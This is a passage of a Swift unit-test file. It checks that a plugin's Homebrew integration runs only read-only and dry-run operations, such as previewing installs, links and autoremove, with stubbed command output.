            return HTTPSTransportResponse(status: 200, headers: [:], body: Data("{\"analytics\":{\"install\":{\"30d\":{\"package\":\(count)}}}}".utf8))
        }
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            XCTAssertEqual(args, ["--version"])
            return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8))
        }, management: HomebrewManagementReads(transport: network))
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("packageAnalytics"), "kind": .string("formula"), "names": .array([.string("wget"), .string("curl")])]), owner: PluginID("rankings"))
        XCTAssertEqual(result.value(atPointer: "/rankings/0/name"), .string("wget"))
        XCTAssertEqual(result.value(atPointer: "/rankings/1/analytics/install/30d"), .number(500))
        let validator = try JSONSchemaSubsetValidator(definition: "result", inSchemaAt: TestRepository.root.appendingPathComponent("PluginAPI/schemas/homebrew-management-reads.schema.json"))
        XCTAssertTrue(validator.errors(for: result).isEmpty)
    }
}

extension HomebrewManagementReadTests {
    func testLargeDoctorReportCannotEvictItsFreshReviewedRepairSet() throws {
        let targets = HomebrewManagementTargets()
        let findings: [[String: Any]] = (0..<100).map { finding in ["text": "Finding \(finding)", "remediation": ["commands": (0..<8).map { "brew link package\(finding * 8 + $0)" }]] }
        let report = try JSONSerialization.data(withJSONObject: ["findings": findings])
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return HomebrewReadOutput(status: 0, stdout: Data("Homebrew 7.0.0\n".utf8)) }
            return HomebrewReadOutput(status: 1, stdout: report)
        }, management: HomebrewManagementReads(targets: targets))
        let owner = PluginID("doctor-set")
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("doctor")]), owner: owner)
        guard case .string(let key)? = result.value(atPointer: "/fix_all/target") else { return XCTFail("Repair set missing") }
        XCTAssertNoThrow(try targets.resolve(target: key, owner: owner))
        XCTAssertEqual(result.value(atPointer: "/truncated"), .bool(true))
    }
}


extension HomebrewManagementReadTests {
    func testCopiedAppsHaveStableDistinctOpaqueIdentitiesAcrossCandidateRefreshes() throws {
        let apps = ["/Applications/Example.app", "/Users/example/Applications/Example.app"].map {
            HomebrewAdoptionApplication(url: URL(fileURLWithPath: $0), name: "Example", bundleID: "org.example.app", version: "2.0", fingerprint: "current")
        }
        let management = HomebrewManagementReads(targets: HomebrewManagementTargets(), applications: { apps })
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            HomebrewReadOutput(status: 0, stdout: Data(args == ["--version"] ? "Homebrew 7.0.0\n".utf8 : "".utf8))
        }, management: management)
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("adoptionCandidates")])
        let first = try profile.read(input, owner: PluginID("adoption")), next = try profile.read(input, owner: PluginID("adoption"))
        let identity = try XCTUnwrap(first.value(atPointer: "/applications/0/identity"))
        XCTAssertNotEqual(identity, first.value(atPointer: "/applications/1/identity"))
        XCTAssertEqual(identity, next.value(atPointer: "/applications/0/identity"))
        XCTAssertNotEqual(identity, try profile.read(input, owner: PluginID("other")).value(atPointer: "/applications/0/identity"))
        let wire = String(decoding: try JSONEncoder().encode(first), as: UTF8.self)
        XCTAssertFalse(wire.contains("/Applications")); XCTAssertFalse(wire.contains("/Users/"))
    }
}


extension HomebrewManagementReadTests {
    func testPreviewHonorsCanonicalItemTrustWithoutRequiringWholeTapTrust() throws {
        var dryRuns = 0
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.8\n".utf8)) }
            if args.first == "info" { return .init(status: 0, stdout: Data(#"{"formulae":[{"name":"canonical","full_name":"acme/tools/canonical","tap":"acme/tools","versions":{"stable":"1.25"},"installed":[]}],"casks":[]}"#.utf8)) }
            if args.first == "trust" { return .init(status: 0, stdout: Data((args.contains("--formula") ? #"["acme/tools/canonical"]"# : "[]").utf8)) }
            dryRuns += 1
            return .init(status: 0, stdout: Data("==> Would install 1 formula:\ncanonical 1.25\n".utf8))
        })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("previewInstall"), "kind": .string("formula"), "names": .array([.string("acme/tools/alias")])]), owner: PluginID("management"))
        XCTAssertEqual(result.value(atPointer: "/packages/0/name"), .string("acme/tools/canonical"))
        XCTAssertEqual(result.value(atPointer: "/succeeded"), .bool(true))
        XCTAssertEqual(dryRuns, 1)
    }

    func testNativeReadOnlyLinkPreviewIncludesRealKegMetadataWithoutChangingLinks() throws {
        let brew = URL(fileURLWithPath: "/opt/homebrew/bin/brew")
        let linked = "/opt/homebrew/var/homebrew/linked/libtommath"
        guard FileManager.default.isExecutableFile(atPath: brew.path),
              let original = try? FileManager.default.destinationOfSymbolicLink(atPath: linked) else {
            throw XCTSkip("Native read-only tracer requires the reviewed installed libtommath keg")
        }
        let profile = HomebrewReadProfile(executable: { brew })
        let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string("previewUnlink"), "kind": .string("formula"), "names": .array([.string("libtommath")])]), owner: PluginID("native-link-preview"), timeout: 15)
        XCTAssertEqual(result.value(atPointer: "/complete"), .bool(true), String(describing: result))
        XCTAssertEqual(result.value(atPointer: "/succeeded"), .bool(true), String(describing: result))
        guard case .array(let changes)? = result.value(atPointer: "/changes") else { return XCTFail("Missing native plan") }
        XCTAssertTrue(changes.isEmpty, "Native CLI output is not an exact filesystem manifest")
        XCTAssertNotNil(result.value(atPointer: "/stdout"))
        XCTAssertEqual(try FileManager.default.destinationOfSymbolicLink(atPath: linked), original)
    }



    func testLinkPreviewReportsConcretePathsWarningsAndNoopWithoutMutationFlags() throws {
        for operation in ["previewLink", "previewUnlink"] {
            var calls: [[String]] = []
            let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
                calls.append(args)
                if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.8\n".utf8)) }
                if args.first == "info" { return .init(status: 0, stdout: Data(#"{"formulae":[{"name":"wget","tap":"homebrew/core","versions":{"stable":"1"},"installed":[{"version":"1"}],"keg_only":false}],"casks":[]}"#.utf8)) }
                let paths = ["/opt/homebrew/bin/wget", "/opt/homebrew/share/man/man1/wget.1"]
                return .init(status: 0, stdout: Data(("Would link:\n" + paths.joined(separator: "\n") + "\n").utf8), stderr: Data("Warning: example diagnostic\n".utf8))
            })
            let result = try profile.read(.object(["tool": .string("homebrew"), "operation": .string(operation), "kind": .string("formula"), "names": .array([.string("wget")])]), owner: PluginID("link-preview"))
            XCTAssertEqual(result.value(atPointer: "/paths/0"), .string("/opt/homebrew/bin/wget"))
            XCTAssertEqual(result.value(atPointer: "/no_op"), .bool(false))
            XCTAssertEqual(result.value(atPointer: "/stderr"), .string("Warning: example diagnostic\n"))
            XCTAssertTrue(calls.contains([operation == "previewLink" ? "link" : "unlink", "--dry-run", "--formula", "--", "wget"]))
            XCTAssertFalse(calls.contains { $0.contains("--force") || $0.contains("--overwrite") })
        }
    }
}

extension HomebrewManagementReadTests {
    func testAutoremovePreviewIsGlobalFormulaOnlyAndNeverRunsMutation() throws {
        let profile = HomebrewReadProfile(executable: { URL(fileURLWithPath: "/opt/homebrew/bin/brew") }, execute: { _, args, _, _ in
            if args == ["--version"] { return .init(status: 0, stdout: Data("Homebrew 7.0.9\n".utf8)) }
            XCTAssertEqual(args, ["autoremove", "--dry-run"])
            return .init(status: 0, stdout: Data("==> Would autoremove 2 unneeded formulae:\nold-lib\nold-tool\n".utf8))
        })
        let input: JSONValue = .object(["tool": .string("homebrew"), "operation": .string("previewAutoremove")])
        let answer = try profile.read(input, owner: .init("management"))
        XCTAssertEqual(answer.value(atPointer: "/packages/0/name"), .string("old-lib"))
        XCTAssertEqual(answer.value(atPointer: "/packages/1/kind"), .string("formula"))
        XCTAssertEqual(answer.value(atPointer: "/dry_run"), .bool(true))
        XCTAssertEqual(answer.value(atPointer: "/complete"), .bool(true))
        XCTAssertEqual(answer.value(atPointer: "/no_op"), .bool(false))
        for extra: [String: JSONValue] in [["kind": .string("cask")], ["names": .array([.string("wget")])], ["args": .array([.string("--force")])]] {
            var fields = ["tool": JSONValue.string("homebrew"), "operation": .string("previewAutoremove")]; fields.merge(extra, uniquingKeysWith: { _, b in b })
            XCTAssertThrowsError(try HomebrewReadInput(.object(fields)))
        }
        let request = try HomebrewReadInput(input)
        XCTAssertEqual(request.kinds, ["formula"])
        XCTAssertThrowsError(try request.authorize(in: .init(capability: .readReviewedTools, commandIDs: [.init("manage")], reviewedTools: [.init(tool: "homebrew", operations: ["previewAutoremove"], kinds: ["cask"])])))
    }
}

extension HomebrewManagementReadTests {
    func testActualLocalAutoremovePreviewNeverStartsAMutation() throws {
        guard ProcessInfo.processInfo.environment["SPINNET_TEST_LOCAL_AUTOREMOVE_PREVIEW"] == "1" else { throw XCTSkip("Explicit local read-only integration opt-in") }
        let result = try HomebrewReadProfile().read(.object(["tool": .string("homebrew"), "operation": .string("previewAutoremove")]), owner: .init("readonly-autoremove-integration"), timeout: 15)
        XCTAssertEqual(result.value(atPointer: "/available"), .bool(true))
        XCTAssertEqual(result.value(atPointer: "/succeeded"), .bool(true), "\(result)")
        XCTAssertEqual(result.value(atPointer: "/complete"), .bool(true), "\(result)")
        XCTAssertEqual(result.value(atPointer: "/dry_run"), .bool(true))
        XCTAssertEqual(result.value(atPointer: "/exit_status"), .number(0))
    }
}
